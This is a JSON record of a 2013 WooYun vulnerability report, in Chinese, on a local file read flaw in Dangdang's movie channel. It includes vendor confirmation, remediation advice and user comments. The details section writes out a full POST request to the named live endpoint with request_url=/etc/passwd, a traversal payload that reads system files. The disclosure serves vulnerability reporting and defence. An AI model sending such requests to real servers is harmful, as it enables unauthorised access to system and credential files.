{"id": 11509, "wybug_id": "wooyun-2013-024762", "wybug_title": "当当网影视频道本地文件读取漏洞", "wybug_corp": "当当网", "wybug_author": "akast", "wybug_date": "2013-05-29 20:59", "wybug_open_date": "2013-07-13 21:00", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "任意文件读取利用", "任意文件读取", "文件操作参数未加过滤", "目录遍历", "敏感信息泄漏", "文件操作不当", "服务配置不当", "任意文件遍历下载", "参数未过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-05-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-05-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-07-13：\t细节向公众公开  简要描述： 当当网影视频道本地文件读取漏洞，通过此漏洞可以拿网站或服务器权限的，和音乐频道一样，不同服务器！！ 详细说明：  漏洞地址：http://movie.dangdang.com/project/movie/hosts/ajax_proxy.php漏洞测试：POST /project/movie/hosts/ajax_proxy.php HTTP/1.1Referer: http://movie.dangdang.com:80/Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestAccept: text/html, */*Content-Length: 128User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)Pragma: no-cacheHost: movie.dangdang.comX-Scan-Memo: Category=\"Audit\"; Function=\"createStateRequestFromAttackDefinition\"; SID=\"33F94C71A41A1688DE4BA57606240676\"; PSID=\"66BBFCCABD85DDC9391E546541E5502C\"; SessionType=\"AuditAttack\"; CrawlType=\"None\"; AttackType=\"PostParamManipulation\"; OriginatingEngineID=\"e33e6007-8935-4d72-b11b-6199480d6c88\"; AttackSequence=\"1\"; AttackParamDesc=\"request_url\"; AttackParamIndex=\"0\"; AttackParamSubIndex=\"0\"; CheckId=\"(null)\"; Engine=\"LFI+Agent\"; Retry=\"False\"; SmartMode=\"NonServerSpecificOnly\"; AttackString=\"%2fetc%2fpasswd\"; AttackStringProps=\"Attack\"; ThreadId=\"282\"; ThreadType=\"AuditDBReaderSessionDrivenAudit\"; Connection: Keep-AliveCookie: CustomCookie=WebInspect123456ZX1496FF27D5214444978008397A2723B2Y7316request_url=/etc/passwd&type=10&content=12345&email=&sender_url=http%3A//movie.dangdang.com/&ques_type=-1&action=research_submit   漏洞证明：  \n\n\n\n   修复方案：  未进行传输的参数：如果忽略预期传递到动态网页的某个参数，应用程序应向用户提供可接受的错误消息。另外，不要在应用程序中使用参数之前，就假设正在传输参数。格式错误的参数：不要假设参数的格式有效。如果该参数要传递到 SQL 数据库，尤其要注意这一点。没有首先检查格式是否正确就直接将字符串传递到数据库，可能存在重大的安全风险。此外，虽然参数通常由组合框或隐藏字段提供，但也不应假定格式正确无误。黑客在尝试入侵您的站点时会首先尝试更改这些参数。允许通过文件名传入文件名：如果要将某个参数用于确定要处理哪个文件，在验证该文件名有效之前，切勿使用该文件名。具体地说，应该测试是否存在表示目录遍历的字符，如 .../、c:\\ 和 /。将关键数据存储在隐藏参数中：许多编程人员犯了这样的错误：将重要的数据存储在隐藏参数或 Cookie 中。他们假定由于用户看不到隐藏参数或 Cookie，因此这里适合存储价格、订单号等数据。实际上，可对隐藏参数和 Cookie 进行操作并将其返回到服务器，因此切勿假定客户端会返回您通过隐藏参数或 Cookie 设置的内容。   版权声明：转载请注明来源 akast@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-05-29 21:44 厂商回复： 感谢提交漏洞，我们立刻处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-09 09:55 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  修复方案好详细    \n     2013-07-13 22:50 |    \t\tling \t\t\t( 实习白帽子  |\t\t\t        Rank:76 漏洞数:35        | 我是屌丝、我为自己代言 。)\t\t \n  @xsser 哥，我提交了3个洞都3-7天了。都还在审核区。有点无语。    \n     2013-07-14 11:19 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  @ling 私信我ID    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}